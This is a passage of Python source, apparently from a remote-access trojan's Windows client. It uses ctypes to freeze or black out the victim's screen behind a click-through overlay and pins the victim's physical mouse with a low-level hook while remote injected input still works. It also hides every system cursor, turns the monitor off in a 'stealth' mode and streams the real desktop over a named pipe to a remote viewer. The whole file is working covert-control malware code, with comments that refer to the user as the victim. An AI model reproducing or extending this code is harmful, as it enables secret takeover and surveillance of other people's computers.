                    ("lpszMenuName", ctypes.c_wchar_p),
                    ("lpszClassName", ctypes.c_wchar_p)]

    class BMIH(ctypes.Structure):
        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                    ("biBitCount", ctypes.c_ushort),
                    ("biCompression", ctypes.c_uint),
                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
                    ("biClrImportant", ctypes.c_uint)]

    class BMI(ctypes.Structure):
        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]

    # per-monitor DPI aware FIRST: all metrics/sizes in PHYSICAL pixels
    # (125% scaling otherwise yields a 1536x864 window on a 1920x1080 panel)
    _ov_refs["ctx"] = u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))
    state = _ov_state
    w, h, bits = state["w"], state["h"], state["bits"]
    if not w or not h:                    # black mode with no prior capture
        w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
        state["w"], state["h"] = w, h
    gone = [False]     # True once WM_DESTROY ran: window already destroyed

    def proc(hwnd, msg, wp, lp):
        if msg == WM_PAINT:
            ps = PAINTSTRUCT()
            hdc = u32.BeginPaint(hwnd, ctypes.byref(ps))
            if black:
                rect = RECT(0, 0, w, h)
                br = g32.CreateSolidBrush(0)
                u32.FillRect(hdc, ctypes.byref(rect), br)   # FillRect = user32
                g32.DeleteObject(br)
            elif bits and w and h:
                bmi = BMI()
                bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
                bmi.bmiHeader.biWidth = w
                bmi.bmiHeader.biHeight = -h
                bmi.bmiHeader.biPlanes = 1
                bmi.bmiHeader.biBitCount = 32
                g32.StretchDIBits(hdc, 0, 0, w, h, 0, 0, w, h, bits,
                                  ctypes.byref(bmi), 0, 0x00CC0020)
            u32.EndPaint(hwnd, ctypes.byref(ps))
            return 0
        if msg == WM_CLOSE:                 # explicit close: destroy now -
            u32.DestroyWindow(hwnd)         # WM_DESTROY below ends the pump
            return 0
        if msg == WM_DESTROY:
            gone[0] = True                  # window really is going away
            u32.PostQuitMessage(0)
            return 0
        if msg == 0x20:                       # WM_SETCURSOR: force hidden
            if (lp & 0xFFFF) == 1:            # HTCLIENT = over our window
                u32.SetCursor(None)
                return 1                      # skip DefWindowProc
        return u32.DefWindowProcW(hwnd, msg, wp, lp)

    # keep EVERY pump callback alive forever: the registered window class
    # still points at earlier trampolines - GC'ing one = access violation
    _ov_refs.setdefault("procs", []).append(WNDPROC(proc))
    _ov_refs["proc"] = _ov_refs["procs"][-1]
    wc = WNDCLASSW()
    wc.lpfnWndProc = _ov_refs["proc"]
    wc.hCursor = None                     # NULL-cursor class hides pointer
    # Unique class name per run: re-registering "nvo" would make every new
    # overlay window reuse the FIRST run's WNDPROC closure - painting the
    # first run's frozen bits and ignoring the black flag (the exact
    # "black shows frozen / repeated overlay shows first capture" bug).
    cls = "nvo%d" % len(_ov_refs["procs"])
    wc.lpszClassName = cls
    if not u32.RegisterClassW(ctypes.byref(wc)):
        if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
            return
    # click-through: WS_EX_TRANSPARENT|WS_EX_LAYERED makes the overlay
    # invisible to hit-testing, so ALL input - the victim's physical
    # mouse/keyboard and netvnc's injected SendInput alike - reaches the
    # windows beneath. The overlay never takes focus and blocks nothing;
    # the victim's cursor is drawn into the composite stream (under layer)
    # via GetCursorInfo/DrawIconEx, never over the overlay itself.
    hwnd = u32.CreateWindowExW(0x8 | 0x80 | 0x20 | 0x80000, cls, "",
                               0x80000000,               # WS_POPUP
                               0, 0, w, h, None, None, None, None)
    if not hwnd:
        return
    state["hwnd"] = hwnd
    u32.SetLayeredWindowAttributes(hwnd, 0, 255, 2)   # LWA_ALPHA opaque
    u32.ShowWindow(hwnd, 8)               # SW_SHOWNA - never takes focus
    u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0050)   # SWP_NOACTIVATE|SWP_SHOWWINDOW
    m = MSG()
    try:
        while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
            u32.TranslateMessage(ctypes.byref(m))
            u32.DispatchMessageW(ctypes.byref(m))
    finally:
        # Exception-safe pump exit: if the pump dies on an error path
        # (GetMessageW returning -1, a dispatch exception) with the window
        # still up, destroy it here. A fullscreen window that outlives its
        # message pump is exactly the "stuck black overlay" bug.
        if not gone[0] and state["hwnd"]:
            u32.DestroyWindow(state["hwnd"])
        state["hwnd"] = None


def _overlay_on(black: bool = False) -> str:
    if os.name != "nt":
        return "[!] overlay: Windows only"
    t = _ov_state["thread"]
    if t and t.is_alive():
        if black == _ov_state["black"]:
            return "[i] overlay already on"
        _overlay_off()   # mode switch: restart in the requested mode
    _under_start()   # keep the composite frame source warm while overlay runs
    if not black:
        _capture_screen()
    t = threading.Thread(target=_overlay_run, args=(black,),
                         daemon=True, name="overlay")
    _ov_state["thread"] = t
    t.start()
    _overlay_watch_start()                # safety net for a pump thread that
    # dies after the state write: the watchdog clears the leftovers
    for _ in range(50):                   # up to ~2.5s for window creation
        if _ov_state["hwnd"]:
            break
        time.sleep(0.05)
    if _ov_state["hwnd"]:
        _ov_state["black"] = black
        _ghost_ref_add("overlay")    # while a frozen/blank overlay is up,
        # ghost the victim cursor so remote input never drags it visibly
        kind = "solid black" if black else "screen frozen"
        return "[+] overlay on (%s, click-through: local and remote input reach the desktop)" % kind
    return "[!] overlay failed to create window"


def _overlay_off(target_hwnd=None) -> str:
    """Best-effort overlay teardown. WM_CLOSE is sent into the overlay
    thread's own pump (its proc calls DestroyWindow on the creating
    thread - legal); a hung/ignoring window gets a cross-thread
    DestroyWindow only as a last resort. Every step is exception-isolated
    so one failure can never leave the screen black or the monitor off.
    target_hwnd guards the watchdog: when the overlay was already
    replaced by a fresh one, the caller (watchdog) backs off."""
    import ctypes
    WM_CLOSE = 0x10
    _ghost_ref_del("overlay")   # restore the victim cursor FIRST: if any
    # later step fails, the victim can still see and move the pointer
    hwnd = _ov_state["hwnd"]
    t = _ov_state["thread"]
    if target_hwnd is not None and hwnd != target_hwnd:
        return "[i] overlay replaced meanwhile (left running)"
    # clear the state BEFORE destructive work: a dying pump or a re-entrant
    # teardown path re-reading the state sees no window and no stale bits
    _ov_state["hwnd"] = None
    _ov_state["bits"] = None
    if not hwnd and (not t or not t.is_alive()):
        return "[i] overlay not running"
    closed = False
    if hwnd:
        try:
            u32 = ctypes.windll.user32
            u32.SendMessageTimeoutW.argtypes = (
                ctypes.c_void_p, ctypes.c_uint, ctypes.c_size_t,
                ctypes.c_ssize_t, ctypes.c_uint, ctypes.c_uint,
                ctypes.POINTER(ctypes.c_ssize_t))
            res = ctypes.c_ssize_t()
            r = u32.SendMessageTimeoutW(hwnd, WM_CLOSE, 0, 0,
                                        0x2,      # SMTO_ABORTIFHUNG
                                        1500, ctypes.byref(res))
            if r and not u32.IsWindow(hwnd):
                closed = True       # pump handled WM_CLOSE -> destroyed
        except Exception:
            pass                    # never let teardown itself raise
    if not closed and hwnd:
        try:
            if ctypes.windll.user32.IsWindow(hwnd):
                # thread wedged or ignored WM_CLOSE: cross-thread destroy
                # beats a permanent fullscreen black window
                ctypes.windll.user32.DestroyWindow(hwnd)
        except Exception:
            pass
    if t and t.is_alive():
        try:
            if threading.current_thread() is not t:
                t.join(timeout=3)
        except Exception:
            pass
    _overlay_leftovers()
    try:
        # full repaint clears dead pixels / stuck black regions
        ctypes.windll.user32.InvalidateRect(None, None, 1)
        ctypes.windll.user32.RedrawWindow(None, None, None, 0x1 | 0x100)
    except Exception:
        pass
    return "[+] overlay off (screen live again)"


def _overlay_leftovers() -> None:
    """Sweep any orphaned nvo* windows belonging to this process. Keeps the
    callback reference alive for the duration of EnumWindows."""
    import ctypes
    found = []
    live_hwnd = _ov_state["hwnd"]   # snapshot: never sweep a window the
    live_t = _ov_state["thread"]    # running state still references

    def cb(hwnd, _lp):
        try:
            u32 = ctypes.windll.user32
            buf = ctypes.create_unicode_buffer(64)
            n = u32.GetClassNameW(hwnd, buf, 64)
            if n and buf.value.startswith("nvo"):
                pid = ctypes.c_ulong()
                u32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                if pid.value == os.getpid():
                    if (hwnd == live_hwnd and live_t
                            and live_t.is_alive()):
                        return True      # live overlay, not an orphan
                    found.append(hwnd)
        except Exception:
            pass
        return True

    try:
        ENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                      ctypes.c_ssize_t)
        cb_ref = ENUMPROC(cb)          # alive for the whole EnumWindows call
        ctypes.windll.user32.EnumWindows(cb_ref, 0)
    except Exception:
        return
    for hwnd in found:
        try:
            ctypes.windll.user32.DestroyWindow(hwnd)
        except Exception:
            pass


# Watchdog: a pump thread that dies after the state write (e.g. an
# exception inside GetMessageW dispatch between the finally-destroy and the
# state clear) would leave _ov_state["thread"] referencing a corpse while a
# half-built window lingers. The lazy 5s tick detects that and runs the
# guarded teardown, so the screen can never stay frozen/black silently.
_ov_watch = {"started": False}


def _overlay_watch_start() -> None:
    if _ov_watch["started"]:
        return
    _ov_watch["started"] = True

    def tick():
        while True:
            try:
                time.sleep(5)
                t = _ov_state["thread"]
                hwnd = _ov_state["hwnd"]
                if not hwnd and (not t or not t.is_alive()):
                    continue              # nothing running: idle
                dead = (not t or not t.is_alive())
                gone = False
                if hwnd:
                    import ctypes
                    try:
                        if not ctypes.windll.user32.IsWindow(hwnd):
                            gone = True
                    except Exception:
                        pass
                if dead or gone:
                    _overlay_off(hwnd)
            except Exception:
                pass                       # watchdog never dies

    threading.Thread(target=tick, daemon=True,
                     name="ovl-watch").start()


def _cb_hookproc(nCode, wParam, lParam):
    # WH_MOUSE_LL: swallow plain WM_MOUSEMOVE (0x0200) only. Injected
    # input - netvnc remote control (SetCursorPos / mouse_event) - is
    # flagged LLMHF_INJECTED (0x1, or 0x2 for lower-IL injectors - NOT
    # 0x10, that is LLKHF_INJECTED for the KEYBOARD hook) and passes
    # through untouched, so the victim's physical mouse is pinned while
    # remote control stays live. MSLLHOOKSTRUCT.flags sits at +12 (POINT
    # 8 bytes + mouseData 4).
    import ctypes
    if nCode == 0 and wParam == 0x0200 and lParam:
        try:
            flags = ctypes.cast(lParam + 12,
                                ctypes.POINTER(ctypes.c_uint)).contents.value
            if not (flags & 0x03):   # LLMHF_INJECTED | LLMHF_LOWER_IL_INJECTED
                return 1
        except Exception:
            pass          # never risk raising inside the hook: pass through
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)


def _cb_hook_start() -> bool:
    """Install WH_MOUSE_LL on a dedicated message-pump thread (low-level
    hook callbacks are only delivered while the installing thread pumps
    messages). Returns True when the hook is live."""
    import ctypes
    import ctypes.wintypes as wt
    u32 = ctypes.windll.user32
    u32.SetWindowsHookExW.restype = ctypes.c_void_p
    u32.CallNextHookEx.restype = ctypes.c_ssize_t
    # default windll conversion is 32-bit: a 64-bit MSLLHOOKSTRUCT pointer
    # as lParam would raise OverflowError inside every callback otherwise
    u32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int,
                                   ctypes.c_size_t, ctypes.c_ssize_t)
    _CB_PROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                                  ctypes.c_size_t, ctypes.c_ssize_t)
    res = {"hook": None, "ev": threading.Event()}

    def run():
        proc = _CB_PROC(_cb_hookproc)
        _cursor_state["cbs"].append(proc)  # keep trampoline alive forever
        hook = u32.SetWindowsHookExW(14, proc, None, 0)  # WH_MOUSE_LL
        res["hook"] = hook
        res["ev"].set()
        if not hook:
            return
        msg = wt.MSG()
        while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            u32.TranslateMessage(ctypes.byref(msg))
            u32.DispatchMessageW(ctypes.byref(msg))

    t = threading.Thread(target=run, daemon=True)
    t.start()
    res["ev"].wait(timeout=5)
    if not res["hook"]:
        return False
    _cursor_state["hooks"].append(res["hook"])
    _cursor_state["thread"] = t
    return True


def _cb_hook_stop() -> None:
    import ctypes
    u32 = ctypes.windll.user32
    t = _cursor_state["thread"]
    if t is not None and t.is_alive():
        u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)  # WM_QUIT
        t.join(timeout=5)
    for hook in _cursor_state["hooks"]:
        u32.UnhookWindowsHookEx(hook)
    _cursor_state["hooks"] = []
    _cursor_state["thread"] = None


def _cursor_block(hard: bool = False) -> str:
    """Pin the victim's PHYSICAL mouse: a WH_MOUSE_LL hook swallows plain
    WM_MOUSEMOVE (no admin needed). Injected input - netvnc remote
    control via SetCursorPos/mouse_event - carries LLMHF_INJECTED and
    passes through, so remote control stays live while pinned.
    hard=BlockInput additionally (admin only). While a pin is live the
    cursor is ghosted: the victim cannot watch it fight the block, and the
    frozen composite stream never drags a stale pointer around."""
    import ctypes
    u32 = ctypes.windll.user32
    t = _cursor_state["thread"]
    live = (t is not None and t.is_alive())
    if live:
        msg = "[i] cursor already pinned"
    else:
        live = _cb_hook_start()
        msg = ("[+] cursor pinned (victim moves blocked, remote control live)"
               if live else "[!] cursor hook install failed")
    if live:
        _ghost_ref_add("block")   # ref-counted: released by _cursor_unblock
    if hard:
        if u32.BlockInput(1):
            msg += ", hard BlockInput on"
        else:
            msg += ", BlockInput failed (needs admin)"
    return msg


def _cursor_unblock() -> str:
    import ctypes
    u32 = ctypes.windll.user32
    u32.BlockInput(0)
    _cb_hook_stop()
    _ghost_ref_del("block")   # physical moves live again: pointer returns
    return "[+] cursor released"


# ===== CURSOR GHOST (hide the victim's pointer system-wide) =====
# Every standard system cursor (arrow, beam, hand, busy, size, ...) is
# replaced by one fully transparent 32x32 cursor. AND mask all 1s + XOR
# mask all 0s means destination = (source AND 1) XOR 0 = source, so the
# image passes through untouched and nothing is ever drawn. Ref-counted:
# overlay / block / manual each hold a tag while they need the pointer
# hidden, so partial teardown can never leave the victim cursor stuck
# invisible, and a mid-teardown crash is repaired by atexit.
import atexit

_ghost_state = {"on": False, "cursors": [], "refs": {}, "atexit": False}
# OCR_ ids for the arrow, text, wait, cross, up-arrow, hand, pen,
# unavail, size-NESW, size-NS, size-NWSE, size-EW, size-ALL, appstarting
_GHOST_OCR_IDS = [32512, 32513, 32514, 32515, 32516, 32642, 32643,
                  32644, 32645, 32646, 32648, 32649, 32650, 32640]


def _ghost_atexit_once() -> None:
    """Register the safety restore exactly once. On a normal interpreter
    exit while the pointer is still ghosted, atexit puts the real cursor
    scheme back (loader_py re-arms the cursor on boot as a second net)."""
    if _ghost_state["atexit"]:
        return
    _ghost_state["atexit"] = True
    atexit.register(_ghost_force_off)


def _ghost_engage() -> bool:
    """Install the transparent cursor over every OCR id. Returns True when
    at least one slot was replaced. A slot the system accepted is owned by
    the system (freed when SPI_SETCURSORS restores the scheme); a slot that
    failed still belongs to us and is destroyed right here."""
    if os.name != "nt":
        return False
    import ctypes
    u32 = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    # GetModuleHandleW is exported by kernel32, NOT user32. Reading it off
    # user32 raised AttributeError on every ghost engage, which propagated
    # out of the unguarded dispatch handlers (overlay on / cursor block /
    # ghost on) and silently killed the beacon process.
    k32.GetModuleHandleW.restype = ctypes.c_void_p
    k32.GetModuleHandleW.argtypes = (ctypes.c_wchar_p,)
    u32.CreateCursor.restype = ctypes.c_void_p
    u32.CreateCursor.argtypes = (ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                 ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
                                 ctypes.c_void_p)
    u32.SetSystemCursor.restype = ctypes.c_bool
    u32.SetSystemCursor.argtypes = (ctypes.c_void_p, ctypes.c_uint)
    u32.DestroyCursor.restype = ctypes.c_bool
    u32.DestroyCursor.argtypes = (ctypes.c_void_p,)
    try:
        hmod = k32.GetModuleHandleW(None)
    except Exception:
        hmod = None
    if not hmod:
        return False
    and_bits = ctypes.create_string_buffer(b"\xff" * 128)   # 32*32/8, all 1s
    xor_bits = ctypes.create_string_buffer(128)              # all 0s
    and_addr = ctypes.addressof(and_bits)
    xor_addr = ctypes.addressof(xor_bits)
    cursors = []
    replaced = 0
    for oid in _GHOST_OCR_IDS:
        try:
            cur = u32.CreateCursor(hmod, 0, 0, 32, 32, and_addr, xor_addr)
        except Exception:
            cur = None
        if not cur:
            continue
        try:
            ok = bool(u32.SetSystemCursor(cur, oid))
        except Exception:
            ok = False
        if ok:
            cursors.append(cur)      # system owns it; freed on restore
            replaced += 1
        else:
            try:
                u32.DestroyCursor(cur)   # still ours: release it
            except Exception:
                pass
    _ghost_state["cursors"] = cursors
    if replaced:
        _ghost_state["on"] = True
        return True
    return False


def _ghost_slot_restore_fallback(u32) -> bool:
    """Belt-and-braces restore: point every OCR slot back at the stock
    system cursor for that slot id so the pointer is guaranteed visible even
    when SPI_SETCURSORS refuses to cooperate. SetSystemCursor takes
    ownership of the handle it is given, so each slot gets a private copy of
    the shared OCR cursor; copies that the system refuses are destroyed
    here. Returns True when at least one slot was re-armed (the transparent
    engage cursors are then no longer referenced by any slot)."""
    try:
        u32.LoadCursorW.restype = ctypes.c_void_p
        u32.LoadCursorW.argtypes = (ctypes.c_void_p, ctypes.c_void_p)
        u32.CopyIcon.restype = ctypes.c_void_p
        u32.CopyIcon.argtypes = (ctypes.c_void_p,)
        u32.SetSystemCursor.restype = ctypes.c_bool
        u32.SetSystemCursor.argtypes = (ctypes.c_void_p, ctypes.c_uint)
        u32.DestroyCursor.restype = ctypes.c_bool
        u32.DestroyCursor.argtypes = (ctypes.c_void_p,)
    except Exception:
        return False
    replaced = 0
    for oid in _GHOST_OCR_IDS:
        try:
            stock = u32.LoadCursorW(None, oid)
            if not stock:
                continue
            copy = u32.CopyIcon(stock)
            if not copy:
                continue
            if u32.SetSystemCursor(copy, oid):
                replaced += 1
            else:
                u32.DestroyCursor(copy)
        except Exception:
            pass          # best effort: never raise from a restore path
    if replaced:
        _ghost_state["cursors"] = []
        _ghost_state["on"] = False
        return True
    return False


def _ghost_disengage() -> bool:
    """Restore the user's saved cursor scheme with SPI_SETCURSORS, which
    reloads it from the profile and frees every transparent cursor we
    installed. State is only cleared when the restore reports success.

    fWinIni deliberately omits SPIF_SENDCHANGE (0x1): on interactive
    sessions the broadcast makes SPI_SETCURSORS return FALSE with
    GetLastError 0, which previously left the pointer invisible. A plain
    session-wide reload (fWinIni=0, or 0x2 to also persist the intact
    scheme) returns TRUE. If SPI still fails, _ghost_slot_restore_fallback
    re-arms every OCR slot from the stock cursors as a second net."""
    if os.name != "nt":
        return False
    import ctypes
    u32 = ctypes.windll.user32
    try:
        u32.SystemParametersInfoW.restype = ctypes.c_bool
        u32.SystemParametersInfoW.argtypes = (ctypes.c_uint, ctypes.c_uint,
                                              ctypes.c_void_p, ctypes.c_uint)
        ok = False
        for fwin in (0, 0x2):
            if u32.SystemParametersInfoW(0x0057, 0, None, fwin):
                ok = True
                break
    except Exception:
        ok = False
    if ok:
        # the system destroyed the replaced handles: drop our references so
        # nothing double-frees them later
        _ghost_state["cursors"] = []
        _ghost_state["on"] = False
        return True
    return _ghost_slot_restore_fallback(u32)


def _ghost_ref_add(tag: str) -> bool:
    """Take a holder reference, engaging the ghost on the first holder.
    Returns True when the pointer is (or already was) invisible."""
    refs = _ghost_state["refs"]
    refs[tag] = refs.get(tag, 0) + 1
    if not _ghost_state["on"] and not _ghost_engage():
        refs[tag] = refs.get(tag, 0) - 1
        if refs[tag] <= 0:
            refs.pop(tag, None)
        return False
    _ghost_atexit_once()
    return True


def _ghost_ref_del(tag: str) -> None:
    """Drop a holder reference; the real cursor returns when the last
    holder lets go."""
    refs = _ghost_state["refs"]
    if refs.get(tag, 0) > 0:
        refs[tag] -= 1
    if refs.get(tag, 0) <= 0:
        refs.pop(tag, None)
    if _ghost_state["on"] and not refs:
        _ghost_disengage()


def _ghost_force_off() -> None:
    """Drop every holder and restore the real cursor unconditionally
    (atexit + stealth teardown path)."""
    _ghost_state["refs"] = {}
    if _ghost_state["on"]:
        _ghost_disengage()


def _ghost_on_cmd() -> str:
    if os.name != "nt":
        return "[!] cursor ghost: Windows only"
    if _ghost_ref_add("manual"):
        return "[+] cursor ghost on (pointer invisible)"
    return "[!] cursor ghost: failed to replace cursors"


def _ghost_off_cmd() -> str:
    if os.name != "nt":
        return "[!] cursor ghost: Windows only"
    _ghost_ref_del("manual")
    if _ghost_state["on"]:
        holders = ", ".join(sorted(_ghost_state["refs"]))
        if not holders:
            return "[!] cursor ghost: restore failed (still invisible)"
        return "[i] cursor ghost still on (held by: %s)" % holders
    return "[+] cursor restored (real pointer visible)"


# ===== STEALTH (blank screen + hold awake, auto-exit on physical input) =====

_stealth_state = {"on": False, "reason": "", "note": None, "thread": None,
                  "hooks": [], "cbs": [], "watchdog": None}


def _stealth_note_physical() -> None:
    """Flag physical input; called from the low-level observer hooks."""
    ev = _stealth_state["note"]
    if ev:
        try:
            ev.set()
        except Exception:
            pass


def _stealth_mouse_proc(nCode, wParam, lParam):
    # passive WH_MOUSE_LL observer: PHYSICAL mouse activity ends stealth.
    # Injected input (netvnc remote control) carries LLMHF_INJECTED (0x1,
    # 0x2 lower-IL) and is ignored. MSLLHOOKSTRUCT.flags sits at +12.
    import ctypes
    if nCode == 0 and lParam:
        try:
            flags = ctypes.cast(lParam + 12,
                                ctypes.POINTER(ctypes.c_uint)).contents.value
            if not (flags & 0x03):
                _stealth_note_physical()
        except Exception:
            pass          # never raise inside a hook: always pass through
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)


def _stealth_kbd_proc(nCode, wParam, lParam):
    # passive WH_KEYBOARD_LL observer: PHYSICAL key activity ends stealth.
    # Injected keys carry LLKHF_INJECTED (0x10) in KBDLLHOOKSTRUCT.flags
    # (offset +8) and are ignored.
    import ctypes
    if nCode == 0 and lParam and wParam in (0x0100, 0x0101, 0x0104, 0x0105):
        try:
            flags = ctypes.cast(lParam + 8,
                                ctypes.POINTER(ctypes.c_uint)).contents.value
            if not (flags & 0x10):
                _stealth_note_physical()
        except Exception:
            pass
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)


def _stealth_hooks_start() -> bool:
    """Install NON-BLOCKING WH_MOUSE_LL (14) + WH_KEYBOARD_LL (13) observers
    on a dedicated message-pump thread. Every event is passed through
    untouched - we only flip a flag on physical (non-injected) input, so
    remote control and victim input both stay live while stealth runs."""
    import ctypes
    import ctypes.wintypes as wt
    u32 = ctypes.windll.user32
    u32.SetWindowsHookExW.restype = ctypes.c_void_p
    u32.CallNextHookEx.restype = ctypes.c_ssize_t
    u32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int,
                                   ctypes.c_size_t, ctypes.c_ssize_t)
    _ST_PROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                                  ctypes.c_size_t, ctypes.c_ssize_t)
    res = {"hooks": [], "ev": threading.Event()}

    def run():
        pm = _ST_PROC(_stealth_mouse_proc)
        pk = _ST_PROC(_stealth_kbd_proc)
        _stealth_state["cbs"] = [pm, pk]   # keep trampolines alive
        h1 = u32.SetWindowsHookExW(14, pm, None, 0)   # WH_MOUSE_LL
        h2 = u32.SetWindowsHookExW(13, pk, None, 0)   # WH_KEYBOARD_LL
        res["hooks"] = [h for h in (h1, h2) if h]
        res["ev"].set()
        if not res["hooks"]:
            return
        msg = wt.MSG()
        while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            u32.TranslateMessage(ctypes.byref(msg))
            u32.DispatchMessageW(ctypes.byref(msg))

    t = threading.Thread(target=run, daemon=True, name="stealth-obs")
    t.start()
    res["ev"].wait(timeout=5)
    _stealth_state["hooks"] = res["hooks"]
    _stealth_state["thread"] = t
    return bool(res["hooks"])


def _stealth_teardown(reason: str) -> str:
    """Belt-and-braces teardown. Every restore step runs even when the
    matching state already looks off: a partial _stealth_on failure must
    never leave the monitor off, the overlay stuck, or the cursor
    invisible. Each step is exception-isolated so a single failure cannot
    abort the rest of the restore."""
    import ctypes
    u32 = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    was_on = _stealth_state["on"]
    _stealth_state["on"] = False
    _stealth_state["reason"] = ""
    t = _stealth_state["thread"]
    if t is not None and t.is_alive():
        try:
            u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)   # WM_QUIT
            if threading.current_thread() is not t:   # never self-join
                t.join(timeout=5)
        except Exception:
            pass
    for hook in _stealth_state["hooks"]:
        try:
            u32.UnhookWindowsHookEx(hook)
        except Exception:
            pass
    _stealth_state["hooks"] = []
    _stealth_state["thread"] = None
    _stealth_state["note"] = None
    _stealth_state["watchdog"] = None
    try:
        k32.SetThreadExecutionState(0x80000000)   # ES_CONTINUOUS: release
    except Exception:
        pass
    # belt and braces: screen state is restored even if stealth was never
    # fully marked on (covers a crash between monitor-off and state write)
    try:
        _monitor_on()
    except Exception:
        pass
    try:
        _overlay_off()
    except Exception:
        pass
    _ghost_force_off()   # drop overlay/block refs wholesale, cursor back
    if not was_on:
        return "[i] stealth not running (screen state restored anyway)"
    return "[+] stealth off (%s) - screen live, input released" % reason


def _stealth_watchdog(ev) -> None:
    """Holds the system awake (ES_CONTINUOUS|ES_SYSTEM_REQUIRED on THIS
    thread) and waits for the physical-input event. Teardown also runs
    here - never in the observer thread - so no thread self-join."""
    import ctypes
    ctypes.windll.kernel32.SetThreadExecutionState(0x80000001)
    ev.wait()
    try:
        _stealth_teardown("physical input")
    except Exception:
        pass


def _stealth_on(reason: str, monitor: bool = True) -> str:
    """Blank-screen stealth: overlay + monitor off + keep-awake, with
    passive observers that end it automatically on victim's physical
    input (injected/remote input never triggers the exit)."""
    if os.name != "nt":
        return "[!] stealth: Windows only"
    if _stealth_state["on"]:
        _stealth_state["reason"] = reason
        return "[i] stealth already on (%s)" % reason
    _stealth_state["reason"] = reason
    _stealth_state["note"] = threading.Event()
    watched = _stealth_hooks_start()
    _overlay_on(True)          # blank click-through overlay
    if monitor:
        _monitor_off()
    _stealth_state["on"] = True
    w = threading.Thread(target=_stealth_watchdog,
                         args=(_stealth_state["note"],), daemon=True,
                         name="stealth-watchdog")
    _stealth_state["watchdog"] = w
    w.start()
    if watched:
        return ("[+] stealth on (%s): screen blanked, system held awake; "
                "victim's physical input ends it" % reason)
    return ("[+] stealth on (%s) WITHOUT input watch (hook install failed) "
            "- run 'stealth off' manually" % reason)


def _stealth_off_cmd() -> str:
    w = _stealth_state["watchdog"]
    if w and w.is_alive():
        _stealth_note_physical()      # watchdog performs the teardown
        w.join(timeout=8)
        return "[+] stealth off (manual)"
    return _stealth_teardown("manual")


def _stealth_status() -> str:
    if not _stealth_state["on"]:
        return "stealth: off"
    w = _stealth_state["watchdog"]
    alive = bool(w and w.is_alive())
    return ("stealth: on (reason=%s, hooks=%d, watchdog=%s)"
            % (_stealth_state["reason"], len(_stealth_state["hooks"]),
               "live" if alive else "DEAD"))


# ===== UNDER-OVERLAY COMPOSITE CAPTURE (netvnc frame source) =====
# Streams the REAL desktop (windows + taskbar, overlay excluded) as raw
# BGRA frames over \\.\pipe\nvunder. The netvnc ffmpeg reads it with
# -f rawvideo instead of gdigrab, so the stream shows live content even
# while the frozen overlay covers the screen. Occlusion-culled per-window
# PrintWindow(PW_RENDERFULLCONTENT) composite, ~12-24 fps at 1080p.
_UNDER_PIPE = "\\\\.\\pipe\\nvunder"
_UNDER_FPS = 12
_under_srv = {"run": False, "w": 0, "h": 0, "thread": None}


def _under_meta_path() -> str:
    return os.path.join(_stream_state_path(), DESK_DIR, "under.json")


def _under_start() -> str:
    if os.name != "nt":
        return "[!] under-capture: Windows only"
    t = _under_srv["thread"]
    if t and t.is_alive():
        return "[i] under-capture already running"
    _under_srv["run"] = True
    t = threading.Thread(target=_under_server_main, daemon=True, name="nvunder")
    _under_srv["thread"] = t
    t.start()
    return "[+] under-capture server started (" + _UNDER_PIPE + ")"


def _under_stop() -> str:
    t = _under_srv["thread"]
    if not t or not t.is_alive():
        _under_srv["run"] = False
        return "[i] under-capture not running"
    _under_srv["run"] = False
    t.join(timeout=5)
    try:
        os.remove(_under_meta_path())
    except OSError:
        pass
    return "[+] under-capture stopped"


def _under_status() -> str:
    t = _under_srv["thread"]
    on = bool(t and t.is_alive())
    line = "under-capture: " + ("RUNNING" if on else "STOPPED")
    if on:
        line += " pipe=%s frame=%dx%dx4 (bgra) @%dfps" % (
            _UNDER_PIPE, _under_srv["w"], _under_srv["h"], _UNDER_FPS)
    return line


def _under_server_main():
    import ctypes
    from ctypes import wintypes

    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    dwm = ctypes.windll.dwmapi
    u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))   # physical px
    W, H = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
    _under_srv["w"], _under_srv["h"] = W, H

    # publish frame geometry so the streamer can build -s WxH
    try:
        os.makedirs(os.path.dirname(_under_meta_path()), exist_ok=True)
        with open(_under_meta_path(), "w") as fh:
            fh.write('{"w": %d, "h": %d}' % (W, H))
    except Exception:
        pass

    class BMIH(ctypes.Structure):
        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                    ("biBitCount", ctypes.c_ushort), ("biCompression", ctypes.c_uint),
                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
                    ("biClrImportant", ctypes.c_uint)]
